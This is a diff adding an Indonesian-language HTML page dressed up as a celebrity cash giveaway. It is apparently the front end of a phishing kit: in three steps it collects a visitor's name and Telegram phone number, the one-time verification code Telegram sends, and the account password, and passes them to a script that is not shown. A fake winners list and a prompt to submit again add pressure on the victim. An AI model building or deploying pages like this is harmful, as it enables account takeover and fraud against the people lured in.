@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Giveaway</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <div class="container">
+      <!-- Carousel Section -->
+      <div class="carousel">
+        <div class="carousel-images">
+          <img
+            src="https://asset-a.grid.id/crop/0x104:600x479/700x465/photo/2020/07/01/1368618060.jpg"
+            alt="Giveaway Image 1"
+          />
+          <img
+            src="https://medialampung.disway.id/upload/16282571909f445c98c10b666926d41c.jpg"
+            alt="Giveaway Image 2"
+          />
+          <img
+            src="https://i.ytimg.com/vi/whiQjyX8Wzk/maxresdefault.jpg"
+            alt="Giveaway Image 3"
+          />
+        </div>
+      </div>
+
+      
+
+      <!-- Form Section -->
+<div class="form-container" id="step1">
+    <h2>Ikuti Giveaway Baim Wong Terbaru 2024 dan Menangkan Hadiah Tunai!</h2>
+    <p>
+        Masukkan data Anda sekarang dan raih kesempatan memenangkan hadiah
+        spektakuler hingga 1 juta rupiah! Jangan lewatkan kesempatan langka ini
+        untuk menjadi salah satu pemenang beruntung kami. Semakin cepat Anda
+        mengisi, semakin besar peluang Anda untuk menang!
+    </p>
+    <h3>Silahkan isi nama dan nomor telegram anda!</h3>
+    <input type="text" id="name" placeholder="Nama Lengkap" required />
+    <input type="tel" id="phone" placeholder="Nomor Telegram" required pattern="\d*" />
+    <button onclick="nextStep(1)">Lanjut</button>
+</div>
+
+<div class="form-container" id="step2" style="display: none">
+    <h3>Masukkan Kode Verifikasi Yang Anda Terima</h3>
+    <p>Silahkan cek pesan Telegram Anda dan masukkan kode yang Anda terima</p>
+    <input type="text" id="otp" placeholder="Kode OTP" required maxlength="5" pattern="\d*" />
+    <button onclick="nextStep(2)">Lanjut</button>
+</div>
+
+
+<div class="form-container" id="step3" style="display: none">
+    <h3>Masukkan Kata Sandi Anda</h3>
+    <p>Silahkan masukkan kata sandi Anda!</p>
+    <input type="password" id="password" placeholder="Kata Sandi" required />
+    <button onclick="submitForm()">Kirim</button>
+</div>
+
+<!-- Modal Pop-up -->
+<div id="confirmationModal" class="modal">
+  <div class="modal-content">
+    <span class="close">&times;</span>
+    <h2>Data Berhasil Dikirim!</h2>
+    <p>Terima kasih telah berpartisipasi. Anda sekarang dapat mengisi form lagi untuk kesempatan lain.</p>
+    <button onclick="resetAndCloseModal()">OK</button>
+  </div>
+</div>
+
+
+
+      <!-- Winners Section -->
+      <div class="winners">
+        <h3>Penerima Hadiah Terbaru</h3>
+        <div id="winner-display">
+          <!-- Nama penerima hadiah akan ditampilkan di sini satu per satu -->
+        </div>
+      </div>
+    </div>
+
+    <script src="script.js"></script>
+  </body>
+</html>
